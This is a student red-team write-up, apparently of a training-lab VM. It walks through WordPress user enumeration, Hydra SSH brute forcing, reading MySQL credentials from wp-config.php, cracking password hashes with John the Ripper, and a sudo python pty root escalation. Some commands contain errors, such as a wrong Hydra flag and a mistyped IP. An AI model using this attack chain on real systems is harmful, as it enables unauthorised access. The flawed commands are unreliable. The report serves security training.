# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

- Nmap scan results for each machine reveal the below services and OS details:

- Command: $ nmap -sV 192.168.1.110

- This scan identifies the services below as potential points of entry:

<img width="594" alt="Screen Shot 2022-08-22 at 7 06 22 PM" src="https://user-images.githubusercontent.com/99222430/186040677-d651561c-a3d8-4adf-95d2-2ca3d09af9e5.png">

## Target 1
  - Port 22/TCP Open SSH
  - Port 80/TCP Open HTTP
  - Port 111/TCP Open rcpbind
  - Port 139/TCP Open netbios-ssn
  - Port 445/TCP Open netbios-ssn


The following vulnerabilities were identified on each target:
## Target 1
  - User Enumeration (Wordpress Website)
  - Weak password/usernames (CWE-521)
  - Brute Force SSH to gain access to system
  - Unsalted password hash and privelege escalation with Python (CWE-328)

### Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:

## Target 1
  - `flag1.txt`: {b9bbcb33e11b80be759c4e844862482d}
    - **Exploit Used**
      - WPScan to enumerate users on the Target1 Wordpress website.
      - $ wpscan --url 192.168.1.110/wordpress
      - $ wpscan --url 192.168.1.110 --enumerate -u

<img width="620" alt="Screen Shot 2022-08-22 at 7 10 20 PM" src="https://user-images.githubusercontent.com/99222430/186041007-88a3320c-8270-4f16-802f-797c199596f5.png">


<img width="623" alt="Screen Shot 2022-08-22 at 7 23 41 PM" src="https://user-images.githubusercontent.com/99222430/186042174-777a120c-fc93-418f-b70e-01a0d295d53e.png">


        - It was known the users password was weak and obvious. It was guessed before any commands were used but for practice, we used Hydra to crack Michael's password.
        - Command: hydra -l michael -p /usr/sahre/wordlists/rockyou.txt -vV 192.16.1.110 -t 4 ssh
          
          <img width="1010" alt="Screen Shot 2022-08-22 at 7 11 07 PM" src="https://user-images.githubusercontent.com/99222430/186041080-5cdde71b-7aca-46e9-95b3-27f8802c57d9.png">
   
          
        - flag1 was found in /var/www/html folder after searching through each file in the directory. The flag1 was found in the service.html in an HTML comment near the bottom of the HTML file. 
      
       
       <img width="624" alt="Screen Shot 2022-08-22 at 7 14 43 PM" src="https://user-images.githubusercontent.com/99222430/186041392-682692bc-fa11-4154-a473-fb3b7292e4e4.png">

       
        
  - `flag2.txt`: {fc3fd58dcdad9ab23faca6e9a36e581c}
    - **Exploit Used**
      - Manaully brute forced Michael's password, and also used Hydra for good measure. His password (password: michael) was weak and easily guessable. This allowed us to SSH into his machine and find flag2. The steps to find the second flag were similar to when we found flag1.
      - flag2 was discovered in /var/www next to a directory named "html".
      - Commands:
        - ssh michael@192.168.1.110
        - password: michael
        - cd /var/www
        - ls -l
        - cat flag2.txt


<img width="405" alt="Screen Shot 2022-08-22 at 7 17 21 PM" src="https://user-images.githubusercontent.com/99222430/186041619-59e48a00-7552-4880-980f-7d59bbd8571f.png">


  - `flag3.txt`: {afc01ab56b50591e7dccf93122770cd2}
    - **Exploit Used** 
      - Same exploits as flag1 and flag2.
      - Once in Michael's system, we captured flag3.txt by accessing the MYSQL database
        - After searching through wp-config.php, we had access to his MYSQL database login credentials and were able to further explore the database.

<img width="617" alt="Screen Shot 2022-08-22 at 7 24 15 PM" src="https://user-images.githubusercontent.com/99222430/186042246-c33c6593-133c-467f-8175-6f446edd3e81.png">

      - Commands:
        - mysql -u root -p
        - We were then prompted for a password, which is 'R@v3nSecurity'
        - show databases;
        - use wordpress;
        - select * from wp_posts;

     <img width="613" alt="Screen Shot 2022-08-22 at 7 24 51 PM" src="https://user-images.githubusercontent.com/99222430/186042296-5890452b-51e7-4f52-98db-20b9999caa8b.png">

<img width="621" alt="Screen Shot 2022-08-22 at 7 26 06 PM" src="https://user-images.githubusercontent.com/99222430/186042398-fd16af81-f44c-4245-b512-2d6acc5fb9b5.png">


  - `flag4.txt`: {715dea6c055b9fe3337544932f2941ce}
    - **Exploit Used** 
      - Unsalted hash and privilege escalation with Python command.
      - For flag4, we cracked user Steven's password using John the Ripper, and looked at Stevens privileges using "sudo -l" ti find how we can escalte our privilege to root.
      - After getting access to the MYSQL database, we found the user's password hashes in the wp_users table. The password hashes were saved on the Kali machine in "wp_hashes.txt" for later use.
          - Commands:
            - mysql -u root -p
            - password: R@v3nSecurity
            - show databases;
            - use wordpress;
            - show tables;
            - select * from wp_users;

<img width="620" alt="Screen Shot 2022-08-22 at 7 27 22 PM" src="https://user-images.githubusercontent.com/99222430/186042479-5532e4a0-556e-4616-8b8b-6cf2b54be78c.png">

      - The wp_hashes.txt file containing Steven's password hashes was cracked using John the Ripper. 
        - Command:
          - john wp_hashes.txt
          
          <img width="605" alt="Screen Shot 2022-08-22 at 7 29 09 PM" src="https://user-images.githubusercontent.com/99222430/186042644-2327d9fb-d0ee-41e1-8e41-3ca2126dc018.png">

          
      - After getting Stevens password, we could now SSH into the server as Steven.
        -Commands: 
          - ssh steven@192.168.1.110
          - password: pink84
          - sudo -l
          - Sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’
      - This Python command allowed us to be the "root@target1" user (Steven).
          - ls
          - cat flag4.txt

        <img width="532" alt="Screen Shot 2022-08-22 at 7 29 38 PM" src="https://user-images.githubusercontent.com/99222430/186042705-0c41a516-51eb-45f2-8035-80934ad7e7e5.png">
